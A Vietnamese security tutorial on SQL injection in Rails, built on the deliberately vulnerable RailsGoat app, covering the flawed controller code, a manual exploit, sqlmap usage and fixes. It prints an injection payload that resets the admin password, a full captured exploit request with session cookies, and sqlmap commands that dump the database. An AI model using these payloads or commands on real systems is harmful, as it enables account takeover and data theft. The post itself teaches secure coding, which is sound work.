# I. Tổng quan vấn đề bảo mật trong Rails
Bảo mật là một trong những vấn đề được các nhà phát triển các framework hiện nay quan tâm rất nhiều và luôn cố gắng nâng cấp, phát triển và cải thiện vấn đề bảo mật cho sản phẩm của họ. Rails framework cũng được các nhà phát triển đưa vào các chức năng, các function hỗ trợ việc ngăn chặn các lỗ hổng bảo mật có thể xảy ra với ứng dụng web. Tuy nhiên dù được hỗ trợ để ngăn chặn các lỗ hổng bảo mật, nhưng việc các lập trình viên sử dụng không đúng theo hướng dẫn từ nhà phát triển hoặc không sử dụng các chức năng, function đó dẫn đến việc các ứng dụng Rails vẫn tồn tại các lỗ hổng bảo mật. Ngoài các lỗ hổng bảo mật đến từ lập trình, việc thiết kế phần mềm không an toàn cũng dẫn đến các nguy cơ về lộ lọt thông tin gây ảnh hưởng nghiêm trọng tới bảo mật của hệ thống. Vì vậy, việc hiểu về các lỗ hổng bảo mật cũng như cách phòng tránh giúp các lập trình viên có thể lập trình ứng dụng an toàn hơn.
# II. Một số lỗ hổng bảo mật phổ biến
Trong bài viết này mình sẽ đi sâu phân tích nguyên nhân, cách khai thác và khuyến nghị cho lỗ hổng SQL Injection trong ứng dụng Rails. Đây là lỗ hổng khá phổ biến và các hậu quả vô cùng nghiêm trọng. Dù Rails đã hỗ trợ việc chống lỗ hổng SQL Injection tuy nhiên việc lập trình viên áp dụng không tốt có thể dẫn đến những hậu quả nghiêm trọng.
## 1. Lỗ hổng SQL Injection
### Nguyên nhân
- Lỗ hổng SQL Injection xảy ra khi ứng dụng không thực hiện kiểm tra và xử lý dữ liệu đầu vào của người dùng trước khi được truyền vào các câu truy vấn SQL. Qua các dữ liệu truyền vào là dữ liệu độc hại, hacker có thể khiến ứng dụng hoạt động sai logic và trả về dữ liệu nhạy cảm của hệ thống hoặc phá hoại dữ liệu của hệ thống
### Phân tích lỗi trong code
- Phân tích việc xử lý dữ liệu truyền vào của user trong controller: `app/controllers/users_controller.rb`
```ruby
  def update
    message = false

    user = User.where("id = '#{params[:user][:id]}'")[0]

    if user
      user.update_attributes(user_params_without_password)
      if params[:user][:password].present? && (params[:user][:password] == params[:user][:password_confirmation])
        user.password = params[:user][:password]
      end
      message = true if user.save!
      respond_to do |format|
        format.html { redirect_to user_account_settings_path(user_id: current_user.id) }
        format.json { render json: {msg: message ? "success" : "false "} }
      end
    else
      flash[:error] = "Could not update user!"
      redirect_to user_account_settings_path(user_id: current_user.id)
    end
  end
```

Đoạn code trên thực hiện tìm kiếm user qua truy vấn SQL sử dụng hàm `where` và truyền trực tiếp dữ liệu của người dùng vào câu truy vấn thông qua `#{params[:user][:id]}`. Người dùng hoàn toàn có thể tùy biến dữ liệu thông qua request gửi lên ứng dụng.

Dữ liệu này trước khi được truyền vào câu truy vấn SQL không đi qua bất kì hàm xử lý hay kiểm tra nào dẫn đến hậu quả kẻ tấn công có thể truyền vào những câu truy vấn nguy hiểm.
### Khai thác lỗ hổng bằng tay
Chức năng bị lỗi SQL injection ở đây là chức năng cập nhật thông tin user.

Thực hiện cập nhật thông tin user và bắt lại request bằng Burpsuite (Một công cụ proxy giúp chúng ta có thể monitor request trước khi trình duyệt gửi lên server). Mặc dù chúng ta thấy không hề có input nhập `user[id]` ở trong form nhưng request gửi lên vẫn có tham số này. Vì vậy chúng ta cần kiểm soát tất cả các tham số chứ không chỉ những tham số có trong form. Công cụ BurpSuite giúp chúng ta dễ dàng quan sát được.

![](https://images.viblo.asia/25aa20e1-219d-4d63-bcab-b0b4a6c00eaf.png)

Quan sát vào request gửi lên chúng ta thấy tham số trong request được gửi lên từ user có param: `user[id]=5` đây là tham số chúng ta có thể thay đổi trước khi dữ liệu được truyền lên server và từ đó khai thác lỗ hổng SQL Injection

Khai thác bằng cách thay đổi id thành: `user[id]=5') OR admin = true -- '`. Và thực hiện sửa request thành request đổi mật khẩu user. Lúc này câu truy vấn của chúng ta sẽ thực hiện như sau:
![](https://images.viblo.asia/2beda111-79b3-493d-a986-b52b3f751f25.png)

Request update password:
```
POST /users/5.json HTTP/1.1
Host: 52.221.254.93:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: */*
Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://52.221.254.93:3000/users/5/account_settings
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 304
Origin: http://52.221.254.93:3000
Connection: close
Cookie: _railsgoat_session=Tys5bmR2WjlzeC85S3J3MXZuUmsxcWxIRmg3TXcwRGRaa1BCZEJOZWpJQmVqam5BbXlRaS9OMFhsVmRIUDBUbjJXcVhFSHZKVm9WZnJSanNMMTJXQUFyaFdJTFFycmEzdWFOVExSTnRjR2FTUUVGUytBdkdyZHkyVkhGRlRQWm1pNXF5RmMweDJxcFFFNlhmTEY2VnJFNjFQa1R0aTIxWmJIaXhTbzNBYUF3UjErS3N2ekkva1R6em9PNi9tbjJqLS1EcjY3Si9WaGFOOE05b3lQME9vT0lRPT0%3D--8bd4019df4e59ac5e3a2ec9de0dda3c4bf56abea; auth_token=u0gA5sWbAxvmMJPGCOlyHA%3D%3D

utf8=â&_method=patch&authenticity_token=4s4+r38qEeqTO3qszjXfZWREbh7FJbn5pVFyzQyHMpjEEWEwfcesAx5lclgmO+sT8lXAbyQPmpp6hDEIksqYWA==&user[id]=5')+OR+admin+%3d+true+--+'&&user[password]=password&user[password_confirmation]=password
```

Câu truy vấn SQL sẽ trở thành:
```ruby
user = User.where("id = '5') OR admin = true -- ''")[0]
```
Kết quả của câu truy vấn sẽ là user có trường `admin = true` , đó chính là tài khoản admin. Và các lệnh update bên dưới sẽ thực hiện việc update thông tin với user này. 
Từ kết quả này chúng ta có thể đổi được password của admin thành mật khẩu chúng ta mong muốn.

### Khai thác lỗ hổng bằng công cụ
Công cụ để khai thác lỗ hổng SQL Injection ở đây là công cụ **SQLmap** một công cụ phổ biến và rất mạnh để khai thác lỗ hổng SQL Injection.
Các bạn có thể chạy SQLmap bằng 2 cách sau"
**Cách 1**: Sử dụng công cụ SQLmap có sẵn trong hệ điều hành Kali Linux

**Cách 2**: Cài đặt python2 hoặc python3. Sau đó clone thư mực sqlmap về và chạy: https://github.com/sqlmapproject/sqlmap

**Hướng dẫn khai thác:**

**Bước 1**: Thực hiện cập nhật user và bắt lại request. Sau đó lưu request vào 1 file txt để khai thác

**Bước 2**: Chạy lệnh: `sqlmap -r dump --risk 3 --technique=BT --random-agent` để kiểm tra lỗi SQL Injection và xác định tham số bị lỗi

**Bước 3**: Chạy lệnh: `sqlmap -r dump --risk 3 --technique=BT --random-agent --dbs` Khai thác lấy database
Tên database: `development_railsgoat`

**Bước 4**: Chạy lệnh: `sqlmap -r dump --risk 3 --technique=BT --random-agent -D development_railsgoat --tables` Để dump các tables trong database
Kết quả:

![](https://images.viblo.asia/f142b353-b33f-45aa-aa86-97ac5a55cb28.png)


### Khuyến nghị
Khi thực hiện việc phát triển chức năng này, lập trình viên cần lưu ý không thực hiện truyền trực tiếp dữ liệu của người dùng vào câu truy vấn SQL khi chưa thực hiện kiểm tra và xử lý dữ liệu đầu vào từ phái người dùng.

Thực hiện tham số hóa các câu truy vấn SQL. Các truy vấn tham số tách biệt truy vấn SQL khỏi dữ liệu động và loại bỏ dữ liệu nguy hiểm.
```ruby
User.where("id = ?", params[:user][:user_id]).first
```
```ruby
User.find(id: params[:user][:user_id])
```
Hoặc đơn giản là sử dụng hàm `current_user` của Rails để xác định user đang được phép thực hiện hành động:
```ruby
  def update
    message = false

    user = current_user

    if user
      user.update_attributes(user_params_without_password)
      if params[:user][:password].present? && (params[:user][:password] == params[:user][:password_confirmation])
        user.password = params[:user][:password]
      end
      message = true if user.save!
      respond_to do |format|
        format.html { redirect_to user_account_settings_path(user_id: current_user.id) }
        format.json { render json: {msg: message ? "success" : "false "} }
      end
    else
      flash[:error] = "Could not update user!"
      redirect_to user_account_settings_path(user_id: current_user.id)
    end
  end
```

### Phân tích thêm về vấn đề
Ngoài lỗ hổng SQL Injection mà ứng dụng  bị lỗi ở đây thì website còn gặp phải một số vấn đề khác gây ra các lỗi về bảo  mật nghiêm trọng ở đây:

**Vấn đề thứ 1**: Không xác định được `user[id]` đang cập nhật và `user[id]` được truyền vào câu truy vấn dẫn đến lỗ hổng IDOR (Insecure Direct Object Reference) sẽ được phân tích kỹ hơn ở các bài viết tiếp theo. Chỉ cần đổi id từ `5` thành `4` chúng ta sẽ cập nhật được thông tin của user có id là 4. Vấn đề này có thể được xử lý bằng cách sử dụng hàm `current_user` như khuyến nghị trên để xác định user đang thực hiện hành động cập nhật thông tin.

**Vấn đề thứ 2**: Chức năng đổi mật khẩu không yêu cầu mật khẩu hiện tại. Chức năng đổi mật khẩu là một chức năng quan trọng và cần người dùng thực hiện re-authenticate (nhập mật khẩu hiện tại). Tuy nhiên ứng dụng đang cho phép đổi mật khẩu mà không cần nhập mật khẩu hiện tại. Khi kết hợp với lỗi IDOR ở vấn đề 1 sẽ gây ra lỗi chiếm quyền tài khoản bất kỳ bằng cách đổi mật khẩu của người dùng khác. Để giải quyết vấn đề. lập trình viên cần yêu cầu thêm người dùng nhập mật khẩu hiện tại và thực hiện kiểm tra trên phía server.
2 vấn đề trên cũng là những vấn đề bảo mật mà lập trình viên cần lưu ý tránh gặp phải trong quá trình phát triển ứng dụng Rails.
# Tổng kết
Qua việc phân tích lỗ hổng SQL Injection chúng ta có thể thấy việc kiểm tra và dữ liệu đầu vào của người dùng là hết sức quan trọng. Nó không chỉ giúp lập trình viên hạn chế các lỗ hổng bảo mật cho ứng dụng web mà còn giúp bảo vệ các lỗi logic khác không mong muốn. Mình mong bài viết đem lại nhiều kiến thức bổ ích về lỗ hổng và lập trình an toàn. Các bài viết sau trong series sẽ tiếp tục với các lỗ hổng khác, rất mong các bạn sẽ đón đọc.